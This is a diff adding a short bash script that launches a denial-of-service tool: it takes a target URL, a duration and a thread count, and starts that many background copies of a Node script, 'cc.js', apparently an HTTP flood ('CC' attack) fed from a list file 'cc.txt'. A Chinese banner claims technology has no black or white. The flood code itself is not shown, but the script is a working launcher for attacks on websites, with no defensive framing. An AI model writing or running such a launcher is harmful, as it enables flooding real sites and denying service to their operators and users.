@@ -1,0 +1,13 @@
+#!/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin;
+export PATH
+echo -e "\e[1;34m 攻防无绝对 技术无黑白  目标:$1 时间:$2 线程:$3 \e[0m"
+COUNT=$3
+FILE="cc.txt"
+URL=$1
+TIME=$2
+
+for ((integer = 1; integer <= $COUNT; integer++)) 
+do 
+	node cc.js $URL $FILE $TIME > /dev/null &
+done
